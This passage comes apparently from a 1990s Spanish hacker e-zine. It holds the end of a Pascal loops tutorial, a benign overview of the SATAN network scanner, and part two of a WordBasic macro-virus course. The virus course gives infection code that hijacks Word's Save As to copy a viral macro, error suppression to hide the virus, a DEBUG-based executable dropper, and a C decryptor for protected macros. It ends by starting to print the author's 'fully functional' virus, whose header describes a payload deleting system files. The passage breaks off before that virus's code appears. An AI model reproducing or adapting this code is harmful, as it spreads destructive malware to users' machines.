las palabras "repeat" y "until" se repetira hasta que "expresion" se cumpla.
Un ejemplo podria ser:

Var ecs:byte;

REPEAT
writeln('Dime un numero del 0 al 255');
readln(ecs);
UNTIL ecs = 100

En este ejemplo el programa nos preguntaria por un numero y hasta que no le
dieramos el valor 100 no pararia de rallar.

- Bucle FOR-DO. Sintaxis:

FOR variable := valor TO limite DO instrucciones

o bien:

FOR variable := valor DOWNTO limite DO instrucciones

Este bucle lo que hace es coger una variable, asignarle un valor, y repetir
una accion hasta llegar al "limite". La instruccion TO o DOWNTO depende de si
queremos ascender (TO) o descender (DOWNTO). Un ejemplillo:

FOR ecs := 1 TO 50 DO writeln('soy tonto.');

Esta instruccion lo que haria seria escribir en la pantalla "soy tonto." unas
50 veces.

- Bucle WHILE-DO. Sintaxis:

WHILE expresion DO instruccion

Con este bucle lo que se hace es poner como limite una expresion logica, del
tipo "si a es igual a b entonces acaba". Si esta expresion no se cumple, el
bucle se realiza. En el momento de cumplirse esta expresion el bucle es
inerrumpido. Ejemplo:

num=1;
WHILE (num < 100) DO
Begin
writeln('Uso de While-Do, frase ', num);
num=num+1;
End;

Lo que esto hace es repetir una frase, poniendo al final el numero de frase
en la que nos encontramos, y despues sumarle uno a una variable, de modo
que el valor de la variable va aumentando progresivamente hasta llegar a 50,
en ese momento se cumple la expresion logica y el bucle finaliza.

Bien pues esto ha sido todo por este numero, si quereis mas, no falteis al
proximo capitulo :P

                              DarK FeaR


==============================================================================
------------------------------------------------------------------------------
==============================================================================


                    +------------------------------+
                    | .oO  Breves sobre SATAN  Oo. |
                    +------------------------------+


Breves sobre SATAN.-
by MegadetH (CrazyJM) -- crazyjm@beer.com -- irc.hispano #netsearch

-Prefacio
-Satan Intro
-Satan mas a fondo
-Exploracion e informes
-Apendice 1 : Instalacion
-Apendice 2 : Satan y Linux
-Apendice 3 : Saint
-Notas finales

-Prefacio

Holas peÒa,bueno ya estamos aqui dando la tabarra de nuevo,XDD,yo
queria y de hecho estoy preparando un arti sobre el IOS (de los
routers de Cisco) pero no me va a dar tiempo a acabarlo juer,
es ke para hacerlo como el ke hay en el mh desk reference no se,
es mejor ampliar y explicar algo mas,lo malo es ke hace falta escri-
bir un libro,en fin ya veremos....
Para no dejar de escribir comento algunas cosillas sobre el famoso progra-
ma SATAN,tb pienso escribir algo sobre el SSL para mas adelante asin
que lo siento por los que esperabais el arti sobre el IOS, o algo mas
interesante ,pacienciaaa :-(

-1 Satan intro

     Satan (security administrator tool for analyzing networks)es una
herramienta que fue desarrollada por los archiconocidos Dan Farmer y Wietse
Venema (en C y Perl) y cuyo proposito es ayudar a los administradores de
redes Unix a encontrar una serie de problemas de seguridad tambien bien
conocidos,los cuales muestra en formato html junto con una serie de
informaciÛn al respecto.(deficiencias en NFS,NIS,Xwindows,RSH,FTP..)obtie-
ne tanta informacion de los servicios de red como finger,nfs,nis,ftp....
como le es posible.

     Fue liberado en Internet en 1985 por primera vez,causando un gran
revuelo porque aunque existian otras herramientas de este tipo,ninguna era
tan facil de usar y tan completa como esta,cuya novedad era el poder extraer
informacion sobre las relaciones entre las makinas de una red.
Satan podria considerarse obsoleto ya que las vulnerabilidades que intenta
descubrir eran novedosas en su dia pero hoy por hoy ya deben estar
solucionadas, salvo que ampliemos sus actividades por nuestra cuenta.
Como fue diseÒada para analizar redes propias no es tan util para analizar
redes ajenas como se pensaba en sus inicios (XD)ya que si se topa con un
firewall por ejemplo,la informacion obtenida es (o debe ser)nula, amen de
dejar infinidad de logs e incluso hay programas (Courtney, por ejemplo
(http://ciac.llnl.gov) y Gabriel) especializados en detectar cuando satan esta
fisgando en la red.
Satan puede ser ampliado aÒadiendole otros programas que amplien sus ac-
tividades,basicamente el corazon del programa consta de los siguientes
elementos:

Magic cookie generator - Este generador crea una cadena que el navegador
(satan se maneja desde un navegador web)envia al servidor de Satan como
parte de los comandos del programa.

Policy Engine - Este componente se utiliza para preparar el fichero de
configuraciÛn de Satan para que escanee unicamente un servidor y el ni-
vel de registro a utilizar.

Target Adquisition - Este componente utiliza la lista de pruebas que ha
de efectuar el programa,registra el nivel de proximidad de los servidores
y la profundidad de las subredes.

Data Adquisition - utiliza la lista que genera el componente anterior para
ver ke herramientas tiene ke utilizar para el escaneo.

Inference engine - utiliza la lista que genera el componente anterior para
ver que nuevos servidores y pruebas ha de escanear.

Report and analysis - Crea los informes en formato html.

     Cuando se ejecuta Satan contra un servidor los componentes "target
adquisition","data adquisition" e "inference engine" se suministran
informacion unos a otros hasta que este ultimo se queda sin servidores.
El archivo de configuracion satan.cf solo contiene variables de entorno
mediante las cuales se puede controlar la aplicacion.

-2 Satan mas a fondo

Magic cookie generator
----------------------

     Cuando se inicia Satan desde un explorador el programa hace lo
siguiente: arranca el demonio httpd de Satan,genera un checksum criptografico
de 32 bytes para el proceso que esta ejecutando (una magic-cookie)la cual
le envia el navegador al demonio httpd para indicarle que ha de trabajar,y no
escribir resultados.Se crea por seguridad una magic cookie nueva para cada
sesion de Satan,por ultimo se cargan los datos de la ultima exploracion de la
base de datos $satan_data (toda la informacion recopilada se almacena en una o
varias bases de datos que se mantiene entre ejecuciones).
El acceso al demonio se hace en un puerto por encima del 1024 (obvio).
Esta magic cookie se guarda en los ficheros html generados por Satan,
asi que estos deben tener permisos de lectura solo para el root,si no 
cualkier usuario podria acceder al server www con la clave proporcionada
es estos archivos y tener acceso a toda la informacion generada por Satan.-

Policy engine
-------------

     Cuando se carga Satan seleccionaremos "target seleccion" que le indica
a police engine los servidores a escanear,a continuacion se cargan los
componentes necesarios para escanear dichos servidores. Para saber el estado
del escaneo se utiliza un valor de proximidad que viene a ser una medida
de la distancia del primer servidor al que se escaneo,si a traves de un 
servidor local accedemos a otros servidores el nivel de meticulosidad va
bajando,en parte por seguridad en parte por velocidad (digo yo),de todas
maneras todo esto se puede controlar desde el archivo de configuracion.

Target Adquisition
------------------

Satan puede escanear un servidor o una red entera,(escaneado de una sub-
red)se pueden especificar los servidores o dejar al programa que decida
mediante el inference engine.Cuando el policy engine determina la lista
de objetivos,el modulo target adquisition genera una lista de pruebas para
efectuar y data adquisition controla el proceso de recolectar datos.
Satan utiliza una utilidad llamada fping que es una variacion de ping,
que escanea un conjunto de servidores,asi evita la espera que puede pro-
ducir la llamada a un servidor que no este disponible.

Data Adquisition
----------------

     Tomando la lista generada por el modulo target adquisition ejecuta las
pruebas contra el servidor,antes,consulta el modulo police engine,para
asegurarse que el usuario ha introducido el nivel de exploracion perti-
nente para dicho servidor,hay tres niveles de exploracion(en el archi-
vo satan.cf se pueden especificar):

 Light- es el menos meticuloso trata de averiguar informacion sobre el sis-
        tema,servicios,archivos compartidos..etc

 Normal- Servicios comunes de redes asi como el s.o etc

 High- El mas meticuloso examina en profundidad todos los servicios de red,
       y cosas como si hay alguna cosa rara en el /etc/host.equiv por ejemplo

     Para efectuar las pruebas satan trae multitud de herramientas,que no son
mas que algunas lineas de codigo en Perl o C cuya salida es registrada por
Satan.Es por eso que se pueden aÒadir mas opciones a la version original.
Los resultados de la exploracion los analiza el modulo inference engine.

Inference engine
----------------

Satan esta basado en makinas de deduccion (inference=deduccion,conclusion)
de forma ke cada makina aplica una serie de reglas y el resultado supone
datos para otra makina o para el "target adquisition", las reglas son:

todo - deciden ke prueba sera la siguiente en efectuarse
host type - clase de sistema y versiones de soft
services - fisgan en los puertos y demonios
trust - clasifica los datos recopilados por las herramientas de servicios
drop - determina que se ha de ignorar

Report and Analysis
-------------------

Presenta toda la informacion recopilada en formato html,de forma ke cada
uno se puede ordenar la informacion como desee,ademas de poder leerla como
damente.

3 - Exploracion e informes.

Despues de instalar satan debemos indicarle ke tipo de exploracion vamos a
realizar (archivo satan.cf)a continuacion lo ejecutamos ,lanzara un servidor
www y el navegador que le hayamos indicado y accedera a la pagina principal
del programa, hacemos click en "run SATAN" el programa muestra algunos
posibles objetivos y el nombre del ordenador desde el ke esta corriendo,todo
esto se puede rellenar a pata,luego hacemos click en "scan the target only"
para un solo host o "scan all hosts in the primary subnet" para todos los
servidores de la subred que queremos escanear.Luego seleccionamos el nivel de
exploracion cuanto mas meticulosa mas pruebas hace y mas tiempo tarda
claro,por ultimo
hacemos click en "start the scan" y al atakeerr.
Bien,Satan divide la informacion obtenida en tres categorias:vulnerabili-
ties,host information y trust,(vulnerabilidades,informacion del servidor  
y confianza)todas ellas con subcategorias que son facilmente accesibles
mediante los links ke se generan,cada problema encontrado tiene un link para
ampliar informacion sobre el,y como solucionarlo.
Vulnerabilities.
Debilidades del sistema,y sus causas,esta dividida en :Approximate Danger
Level (nivel de peligro aproximado)cuanto mas alto mas peligroso,type of
vulnerability (tipo de vulnerabilidad)tipos de fallos y los servidores que
los tienen, y vulnerability count (contador de vulnerabilidades)ordena los
servidores segun la cantidad de fallos que encuentra.
Host Info
Informacion sobre los servidores analizados,si un servidor aparece marcado
con un punto rojo significa que satan ha encontrado algun problema grave
(siempre es bueno comprobarlo por si mismo)y si aparece un punto negro
significa que satan no ha encontrado nada (repito que es bueno comprobarlo
por ti mismo y usar satan solo como referencia,amas aparecen nuevas
vulnerabilidades cada dia que naturalmente satan no contemplara hasta que
sea actualizado por sus autores o por ti mismo),bien aki tb aparecen sub
categorias:Class of service (tipo de servicio)informa sobre los distintos
servicios encontrados,system type(tipo de sistema)fallos propios de cada
sistema,Internet domain (dominio de internet)servidores analizados agrupa-
pos por DNS,subnet(subred)subredes analizadas,host name(nombre del
servidor)nombre del servidor y toda la informacion relacionada.
Trust
Sistemas en los que se puede confiar,comparticion de archivos,registro a
distancia,servicios r..etc



Apendice 1 :Instalacion:
 
La ultima version de Satan esta disponible en muchos servidores de ftp asi
como de http,la pagina oficial de Satan se encuentra en:
http://www.trouble.org/satan °°uhmmm esto parece que ya no rula!!
sitios recomendables para bajarselo:
ftp://ciac.llnl.gov/pub/ciac/sectools/unix/satan
ftp://sunsite.unc.edu 
una vez obtenido el archivo comprimido (suele ser .tar.gz)se descomprime
con el archiconocido tar zxvf satan-1.1.1.tar.gz(hay ke tener instalado
perl5),a continuacion hay que editar los archivos /config/path.ps y
/config/path.sh y aÒadir la ubicacion de las utilidades del sistema,luego
hay que editar el archivo /config/satan.cf para que el programa actue a tu
gusto,por ejemplo las variables $only_attack_these (solo dejara a satan
escenear los servers ke le des como valor) y $dont_attack_these (satan no
podra escanear lo que le pongas como valor).Ejecutar el script reconfig,
(perl reconfig en linux)que configura el PERL 5.00 y el explorador a usar,
a continuacion editar la variable $MOSAIC (salvo ke sea este el navegador
a usar)del archivo /config/path.pl y poner en su lugar el navegador que se
va a utilizar.
Ejecutar el comando ./make especificando el sistema
(hpunix,sunos,aix,linux..etc)
Por ultimo ejecutar (como ROOT) el script SATAN,ya que hace uso por ejemplo de
sockets y si no lo ejecutamos como su. algunas de las pruebas no rularan.
(Todos estos pasos desde dentro del directorio creado al descomprimir el
tar.gz,en este caso /satan-1.1.1)
En el directorio /facts existen unas reglas escritas en Perl y a traves de
ellas de puede ampliar el programa con nuevos tests.


Apendice 2 : Satan y Linux

Satan no fue desarrollado originalmente para correr en sistemas GNU/Linux
para que funcione hay que modificarlo,de hecho hay que modificar los
ficheros que se incluyen para adaptarlos a la libreria C de Linux,aunque
varia segun sea para Libc5 o para las Libc6 (Glibc)principalmente por
los cambios en la implementacion de los formatos de paquetes IP e ICMP,
Esto se puede arreglar comentando toda la definicion del paquete ip e 
icmp del fichero lcompat.h y dejar que sea la libreria de C la que los 
defina (/usr/include/netinet/ip.h).Se pueden tambien eliminar las refe-
rencias a la libreria proporcionada en el paquete, si se dispone de las
cabeceras de la libreria C que usemos,para compilar el paquete.Tambien
para usar los modulos de Perl que tengamos instalados en el sistema en
lugar de los del programa hay que retocar el programa principal y algunos
de los tests.Tambien hay fallos en el comportamiento de la llamada al sis-
tema select y en el fichero tcp_scan.c
Para areglar todo esto habia un parche en ftp://sunsite.unc.edu para el
Satan-1.1.1 y hay una version Satan-1.1.1-linux.fixed.tgz disponible en la
web de Satan,esta version corrige todo lo arriba indicado y rula pero sigue
dando problemas de saturacion de los buffers cuando satan ejecuta fping en
muchos servidores,la solucion es reprogramarlo por tu cuenta XDDD,bueno otra
no tan drastica es no hacerle escanear un gran numero de servers.
Al cierre de este articulo he descubierto una version "Satan-1.1.1.-linux.
fixed2.tgz" que no he probado aun.


Apendice 3 : Saint

Saint (Security Administrator¥s Integrated Network Tool)es una cracion de
World Wide Digital Solutions derivado de Satan y realizado en 1998.
La licencia bajo la que se distribuye no permite su modificacion fuera 
del uso interno ni su distribucion.El programa,como Satan,usa un navegador
www,y se pone en marcha igual que Satan,este programa realiza los mismos
test que Satan y aÒade comprobaciones de vulnerabilidades aparecidas hasta
la fecha de su creacion,ademas es actualizado periodicamente,y da mas
informacion que su antecesor.Puede escanear makinas Windows en redes unix
usando Samba,y se rumorea la aparicion de una version para Windows escrita en
Java.
-www.wwdsi.com-

Notas finales

Satan se puede ejecutar desde la linea de comandos,pero es mucho mas
facil hacerlo desde un explorador web,Satan consume bastantes recursos
del sistema,por lo ke hay ke liberar las cargas del mismo si no es un
sistema muy bien dotado de ram y de procesador,se pueden ejecutar varios
procesos de Satan a la vez,pero hay que suministrarle una base de datos
a cada proceso,e indicarles que compartan los informes;se recomienda si
se es novato empezar a escanear con el nivel menos meticuloso,o con el
normal por lo menos ,para no verse abrumado por la cantidad de cosas que
pueden ser encontradas,tambien se recomienda escanear la red propia des-
de dentro y desde fuera aun con el firewall levantado;verifica los agu-
jeros y defectos encontrados por Satan,y por ultimo recuerda que Satan
deja infinidad de logs,y que muchos sysadmin cancelaran tu cuenta en
el sistema si encuentran Satan en tu /home y que debes bajarte Satan de
alguna fuente fiable y si es posible comprobarlo mediante la suma MD5 del
fichero recibido,ya que al estar disponible los fuentes no seria dificil
meterle algun codigo extra para que enviara informacion a algun otro sitio
de inet ,por ejemplo.Si tu navegador te da problemas al intentar ver las
paginas web generadas por satan que en realidad son scripts en Perl y por
eso terminan con la extension .pl ,es seguramente porke tiene .pl configu-
rado como un tipo MIME determinado (application/x-perl)y entonces el nave-
gador no sabe que hacer (navigator por ejemplo,te pregunta donde quieres
guardarlas)par arreglar esto basta con eliminar el tipo MIME asociado a la
extension .pl y aÒadir dentro de los documentos interpretados por el nave-
gador la misma extension. 

Salud.-

       "Procura entender todo lo ke te dicen, pero no creas nada"


==============================================================================
------------------------------------------------------------------------------
==============================================================================


              +------------------------------------------------+
              | .oO  Iniciacion a los Virus de Macro (II)  Oo. |
              +------------------------------------------------+


                       PROFUNDIZANDO EN LOS VBA VIRUS
       
 Por MoebiuZ

 


--------- [ Sintaxis de WB ]


     Bueno, para los que no esten familiarizados con este tipo de sintaxis ...
 un tiron de orejas. Que repasen sus conceptos de programacion. Pero vamos a
 hacer un breve resumen para poder entender lo que estamos viendo.

 

                           # Instruccion condicional #


       If ... Then ... Else

	Ejecuta instrucciones de forma condicional.


Por ejemplo: 
______________________________________________________________________________

DefinirI()              ' Rutina ejemplo que genere un valor aleatorio para i 

If i = 1 Then              ' Si "i" es igual a 1 muestra el siguiente mensaje 

MsgBox "El valor de i es 1", 0 

Elsif i = 2 Then          ' En cambio, si "i" es igual a 2 muestra este otro

MsgBox "El valor de i es 2" , 0

Else          ' "Si no" ocurre ninguna de las dos condiciones anteriores (ni 1
              ' ni 2) este otro mensage

MsgBox "El valor de i no es ni 1 ni 2" , 0

End If
______________________________________________________________________________
 
                            
                               # Instruccion repetitiva #

              For ... Next


 Ejemplo:
 _________________________________________________________________________

 For i = 1 To 10        ' Desde i = 1 hasta 10

 Beep                   ' Pitido

 Next i                 ' Siguiente valor de i ( Es decir i + 1 )
 _________________________________________________________________________

 Este codigo emitiria 10 pitidos (uno por cada valor de i )

 

                             # Instruccion condicional #

              While ... Wend


 Ejemplo:

 ________________________________________________________

 i = 1

 While i <> 10        ' Mientras i sea distinto de 10 

 Beep 

 i = i+1 

 Wend
 ________________________________________________________

 Este codigo emitiria 9 pitidos, que son los valores que va tomando "i" hasta
 llegar a 10.

 

                             # Instruccion "ir a" #

              Goto etiqueta


        Esta es la tipica instruccion de los antiguos lenguajes de
 programacion, que todavia puede encontrarse en algunos de los actuales, pero
 que no es muy recomendable, puesto que es muy poco eficiente. Es mas
 aconsejable usar siempre las estructuras anteriores.

 _____________________________________________________________________________

 Sub MAIN

 MsgBox "La siguiente instruccion goto saltara a la etiqueta :fin,
         ignorando el resto" , 0

 Goto fin

 MsgBox "Por aqui no pasa" , 0

 :fin

 End sub
______________________________________________________________________________


 Una vez repasados estos conceptos, proseguimos con el viriing.

 


----- [ Los Comandos de Word: Macros ArchivoGuardar, ArchivoGuardarComo,
        ArchivoAbrir ... ]

        Todos sabemos que cuando pulsamos con el mouse sobre la barra de
 herramientas, aparece un menu desplegable con varias opciones. Por ejemplo,
 en Archivo, podemos encontrar el tipico Nuevo, Guardar, Guardar Como..., etc

        Todas estas operaciones son los comandos del Word, y no son en
 realidad mas que simples Macros de solo ejecucion.

 Pero, Que pasaria si creasemos en la plantilla Global una Macro con el
 nombre, por ejemplo, ArchivoGuardarComo?

 Pues bien, se crearia automaticamente una Macro que llama al cuadro de
 dialogo que aparece cuando pulsamos sobre esa opcion.

 Seria asi:

 _____________________________________________________________________________
 
 Sub MAIN

 Dim dlg AsArchivoGuardarCom    ' Define dlg como cuadro de dialogo
                                ' ArchivoGuardarComo

 GetCurValues dlg               ' Coge los valores del cuadro de dialogo

 Dialog dlg                     ' Muestra el cuadro en pantalla
 
 ArchivoGuardarComo dlg         ' Guarda el archivo segun los parametros
                                ' obtenidos del cuadro

 End Sub
 _____________________________________________________________________________


 Nota: Fijarse que en la primera linea aparece AsArchivoGuardarComo todo
 junto, cuando deberia ser As ArchivoGuardarComo. Si lo dejamos como esta,
 nos dara un error.

 Bien, esto lo que haria no seria mas que definir dlg como cuadro de dialogo
 de Guardar Como, coger los valores de ese dialogo y mostrarlo en pantalla; lo
 que viene haciendo Archivo / Guardar Como. Hasta ahi todo normal, pero, que
 pasaria si colocamos algunas lineas mas en esa Macro, a nuestro antojo? 

 Mira este otro codigo:

 _____________________________________________________________________________

 Sub MAIN

 Dim dlg As ArchivoGuardarComo

 GetCurValues dlg

 Dialog dlg

 ArchivoGuardarComo dlg

 ArchivoGuardarComo .Formato = 1  ' Guarda el archivo con el formato de una
                                  ' plantilla
                                  ' ( Nota: Esto es solo un ejemplo. Si
                                  ' hiciesemos algo asi,
                                  ' cualquier archivo se guardaria con este
                                  ' formato, incluso si fuese de solo texto)

 Infectar() 	         	  ' Llama a la rutina infectar

 ArchivoGuardar                   ' Guarda de nuevo lo cambios

 End Sub
 _____________________________________________________________________________
 

 Sub Infectar

 MacroCopiar "Global:MacroVirica" , NombreVentana$() + ":MacroVirica" , 1

 End Sub

 

 A partir de ahora (siempre y cuando la Macro se llame ArchivoGuardarComo y
 este en la plantilla global), cada vez que pulsasemos sobre
 Archivo / Guardar Como..., a los ojos del usuario todo seria normal, pero el
 archivo guardado tambien seria infectado.

 Lo mismo se puede hacer con ArchivoGuardar, ArchivoAbrir ...

 Nota: Los comandos de Word los puedes ver en el menu de Macros, pero son solo
 ejecutables, por lo que solo podras leer el nombre, no su codigo.

 


------- [ Evitando Errores ]


        WB es un lenguaje interpretado, y como tal, los errores surgiran "in
 situ", a medida que se producen. Pero afortunadamente, los errores pueden ser
 interceptados.

 Con la instruccion:

         On Error Resume Next

 Conseguiremos que los errores internos a WB ( no los errores que se produzcan
 en el propio Word) no muestren en pantalla el mensage de error, y el codigo
 seguira ejecutandose en la siguiente instruccion. Esto es muy util para
 evitar que el virus sea detectado por el usuario en caso de error.

         On Error Goto etiqueta

 Tendria el mismo efecto, con la diferencia de que esta vez no continua la
 ejecucion en la siguiente instruccion, sino que salta a la etiqueta del mismo
 modo que un Goto (que es lo que realmente es).

 Para desactivar la deteccion de errores solo hay que utilizar la siguiente
 instruccion:

         On Error Goto 0

 Todos los errores de Word tienen un numero de identificacion. Si queremos
 conseguir ese numero, lo haremos con la variable especial Err, cuyo valor es
 el ultimo error producido.

------- [TECNICAS AVANZADAS] 

        Ahora comentare algunas tecnicas avanzadas, solo como guia, y para
 "activar" tu imaginacion ;-)
	
	> Macros solo-ejecutables <
	
 Lo tipico que se hace para encriptar una macro es hacerla solo-ejecutable.
 Esto no es mas que un simple XOR, or lo que podemos desencriptarlas y ver su
 codigo. Si leemos el fichero, debemos buscar el verdadero nombre del fichero
 en el. Unos cuantos bytes despues de el encontraremos una "U". Pues bien, el
 byte siguiente a esa "U" es la clave XOR que debemos usar para desencriptarlo
 Por supuesto, habra tantas "U" como macros tenga el documento., y una clave
 XOR para cada una. Depues no hay mas que encontrar el comienzo de las macros,
 que normalmente esta en  la direccion B89h o en 1509h. Simpre hay la
 secuencia A5h, C6h , 41h, un byte y el valor XOR. Los problemas pueden
 comenzar si el documento tiene macros normales y macros solo-ejecutables.
 Prueba a borrar algunas macros, y despues desencriptar.

 Adjunto un programa en C que podria ser util.


<++> virii/decrypt.c !19f1ab14
/*********
  (c) AURODREPH Productions 04/1996
**********/

#include "io.h"
#include "stdlib.h"
#include "stdio.h"
#include "conio.h"
#include "process.h"
#include "fcntl.h"
#include "string.h"
#include "sys\stat.h"

void main (void)
 {
	char Name[13];
	char Target[13];
	unsigned char *Buffer;
	int Handler, Handler1;
	unsigned int Offset;
	unsigned long Length = 0;
	int point, max, trouve, cledec, debmac, decfin;
	int stop,nbr,positcle,nbrmac,i;

	clrscr();
	printf (" ******************************************************************\n");
	printf (" *                                                                *\n");
	printf (" *               DECRYPT WORD 6.0 MACROS saved                    *\n");
	printf (" *                 with the option Execute-only                   *\n");
	printf (" *                                                                *\n");
	printf (" *                                                                *\n");
	printf (" *       --- ,This file works only with files < 32 Ko. ----       *\n");
	printf (" *     <*****}===============-                                    *\n");
	printf (" *      (z)  ' AURODREPH Productions 04/1996                      *\n");
	printf (" *                                                     ver 0.666B *\n");
	printf (" ******************************************************************\n");
	printf ("\n"); printf("\n");
	printf ("Name of the input file     = ");
	scanf ("%12s",Name);
	printf ("\n");
	printf ("Name of the output file    = ");
	scanf ("%12s",Target);
	printf("\n");
	printf ("Number of crypted macros   = ");
	scanf ("%d",&nbrmac);
	printf("\n");
	if (nbrmac > 50 ) {exit (0);}
	Handler = open (Name, O_BINARY | O_RDONLY , S_IREAD);
	if (Handler == -1)
		{printf ("The input file doesn't exist.\n"); exit(0);}

	Length = (unsigned long) lseek(Handler, 0, SEEK_END);
	lseek (Handler,0,SEEK_SET);
	Buffer = (unsigned char *) malloc((unsigned) Length);
	if (Buffer == NULL) printf ("Fail memory allocation.\n");
	if (read(Handler, Buffer, (unsigned) Length) != Length)
		{printf ("The size of the file is > 32 ko)\n");
		 printf ("Try to remove some macros with WORD....\n");
		 exit (0);}

	point = 0;
	max = strlen(Name);
	trouve = 1;
	cledec = 0x00;
	debmac = 0x00;
	stop = 0;
	for (i=0; i<max;i++)
		{if ((Name[i]>= 0x61) & (Name[i]<= 0x7A))
			 { Name[i] = Name[i] & 0xDF ;}
		};

	for (Offset = 0x0000; Offset < Length; Offset++)
	 {
	  if ((Buffer[Offset] == Name[point]) && (stop !=1))
			{
			for (point = 1; point <= (max-1); point++)
				 {if (Buffer [Offset+point] == Name[point])
							{ trouve = trouve+1; }                                                  }
							else trouve = 1;
				 };
			}
	  if (trouve == max) {stop = 1;}
	  if ((trouve == max) && (Buffer[Offset] == 0x55))
			{cledec = Buffer[Offset+1];
			trouve = 0;
			Buffer [Offset+1] = 0x00;
			positcle = Offset;
			}
	  point = 0;
	 };
if (cledec == 0x00)
	{printf (" Don't find the decrypted key... \n"); exit (0);}
	else printf ("Decrypted Key for the macro n 1 = %x \n", cledec);

	for (Offset = 0x0000; Offset < Length; Offset++)
	 {
	  if (Buffer[Offset] == 0xA5)
	  {if ((Buffer [Offset+1] == 0xC6) || (Buffer [Offset+1] == 0xC4))
		  {if (Buffer [Offset+2] == 0x41)
			  {if (Buffer [Offset+4] == cledec)
					{debmac = Offset+3;
					}
			  }       }       }      };
if (debmac == 0x00)
		{for (Offset = 0x0000; Offset < Length; Offset++)
				 {
				 if (Buffer[Offset] == cledec-1)
					{if (Buffer [Offset+1] == cledec)
					       {debmac = Offset;  }
						}        };             }
if (debmac == 0x00) { printf (" Don't find the beginning of the macro\n");      exit(0);}


for (nbr = 1 ; nbr <= nbrmac ;nbr++)
{
if (nbr != 1)
	{
	printf ("\n");
	printf (" I decrypt the macro n %d \n", nbr);
	Offset = positcle+24;
	 if (Buffer[Offset] ==  0x55)
			{cledec = Buffer [Offset+1];
			Buffer [Offset+1] = 0x00;
			positcle = Offset;
	   printf ("Decrypted Key for the macro n %d = %x \n", nbr,cledec);
				}
			else
		    {printf (" Don't find the decrypted key ....\n");}
	}
Offset = debmac;
point = 0;
decfin = 1;
stop = 1;
printf ( " I work ");
	do
	{ if (stop == 400) {printf ("."); stop = 1 ;}
	  Buffer[Offset+point] ^= cledec ; /* decryptage par XOR */

	  if (Buffer [Offset+point] == 0x64)
				{Buffer [Offset+point+1] ^= cledec;
				if (Buffer [Offset+point+1] == 0x1a)
					{Buffer [Offset+point+2] ^= cledec;
						if (Buffer [Offset+point+2] == 0x1b)
							{Buffer [Offset+point+3] ^= cledec;
							if (Buffer [Offset+point+3] != 0x64)
								 {decfin = 0;
								 debmac = Offset+point+3;
								 Buffer [Offset+point+3] ^= cledec;
								 }
							else
								 Buffer [Offset+point+3] ^= cledec;
							}
						else
							Buffer [Offset+point+2] ^= cledec;
				}
				else
					 Buffer [Offset+point+1] ^= cledec;
		}
	if ((Offset+point) == Length) {decfin = 0;}

	stop = stop + 1;
	point = point + 1;
	}
	while ( ( decfin != 0) );
printf ("\n");
printf (" End of decrypting the macro n %d \n", nbr);
};

	_fmode= O_BINARY;

	Handler1 = creat(Target, S_IFMT | S_IREAD | S_IWRITE);
	write (Handler1, Buffer,(unsigned) Length);

	close (Handler1);
	close (Handler);
	printf ("\n"); printf ("\n");
	printf (" END ... \n");
	printf ("\n");
	printf (" The decrypted file is  %s .\n", Target);
}
<-->

	
	> Polimorfismo <

        Es posible hacer virus polimorficos en WordBasic. Una manera sencilla
 seria hacer que las macros tomaran nombres al azar en cada generacion.


	> Uso de DEBUG <

        Ultimamente es muy corriente encontrarse especimenes que utilizan el
 debug del DOS para volcar pequeÒos ejecutables, plantillas, ... en el disco
 duro para luego ser ejecutadas. Os muestro aqui una pequeÒa rutina para
 ilustrarlo:

________________________________________________________

Open "C:\programita.scr" For Output As #1
Print #1, "N BOOM.COM"
Print #1, "E 0100 E9 AF 13 9F 4D D1 0F D9 0A D7 0A B2 25 EB 67 C2"
Print #1, "E 0110 26 F6 20 F7 33 E6 67 BA 24 BB 67 A3 7E EB 7E 9F"
Print #1, "E 0120 4D 98 15 FD 32 E6 2E FC 22 B2 30 FB 2B FE 67 E0"
Print #1, "E 0130 22 E6 32 E0 29 B2 34 EB 34 E6 22 12 67 FB 29 F4"
Print #1, "E 0140 28 E0 2A F3 33 FB 34 FC 67 F4 28 E0 67 E1 33 F3"
Print #1, "E 0150 29 F6 26 B0 23 9F 4D B2 67 B2 67 B2 67 B2 67 DB"
Print #1, "E 0160 05 DF 67 C2 04 E1 67 F3 29 F6 67 F1 2B FD 29 F7"
Print #1, "E 0170 34 B2 35 E7 29 FC 2E DC 20 B2 0A C1 68 C2 04 B2"
...
print #1, "RCX"
print #1, "400"
Print #1, "W"
Print #1, "Q"
Close #1
Open "c:\boom.bat" For Output As #1
Print #1,  "@echo off"
Print #1, "debug < programita.src > nul"
Print #1, "boom.com"
Close #1
______________________________________________________________

 Nota: Los valores Hexadecimales del ejemplo son inventados, asi que no
 intentes nada con ellos.

        Se te ocurren mas utilidades para esto ... ;-)




--------- [ MISCELANEA ]

        Para terminar este pequeÒo curso, aqui podeis ver el
 WM6.iNCorDio V 1.0 , un virus sencillo y  totalmente funcional creado por un
 servidor.

 Por favor, no lo distribuyas. Simplemente lo incluyo como apoyo al
 documento para comprender mejor el concepto de virus de Macro.



<++> virii/wm6.incordio !e419065e
'
'        /^{M}^\                      WM6.iNCoRDio V1.0                      /^{M}^\
'
'
' # Coder: MoebiuZ   moebiuz@biogate.com
' 
' # Origin: Madrid, Spain
'	    April 25 1999
' 
' # Size: 5,35 Kbytes 
'
' # Stealth: Semi. It emulates Macros Dialog and deactivates Templates Menu.
'
' # Encrypted: Yes. Only-executable Macros.
'
'# Polymorphic: No
'
' # Infects: Spanish versions of Word.
'
' # ReMovable: Yes. U must remove normal.dot.
'
' # MultiLanguaje: No. It only infects Spanish versions of Word.
'
' # Payload: On 15 August (My sister's birth :-) ) kills io.sys and 
'            Msdos.sys, and changes win.ini [colors] definitions to 
'            "00 00 00" getting dark Windoze.
' 
' 
' Simple, quick and effective, but too many easy.
'
' Well, this virus consists in six Macros:
'
' # AutoOpen: Infects the global template, copying itself and the rest of Macros.
' # iNFeCT: Is copied as ArchivoGuardarComo. This Macro infects other docs when FileSaveAs.
' # iNFeCT2: Is copied as ArchivoAbrir. When a doc is opened then infects it.
' # iNCoRDio: It contains infect subrutine. It can distinguish if is an .doc, .dot or .rtf 
'             file. In other case does¥t infect.    
' # ChapaAuto: Is copied as AutoExec. When starts Word, autoMacros are deactivated
'              so Word can't be infected by other WM virus using autoMacros.
' # ChapaMacros: Is copied as HerramMacro. EMulates the Macros ... dialog box, but it doesn't
'                shows any Macro nor record or reMoves anything ;-)
' # ChapaPlan: Is copied as ArchivoPlantillas. Is an eMpty Macro, and deactivates thus
'              the teMplates Menu of "Files".
' 
' These two last Macros are the seMi-stealth MechanisM. I say "seMi", because if u aren't
' stupid u can see that soMething is incorrect, but ... fortunately the greater part of
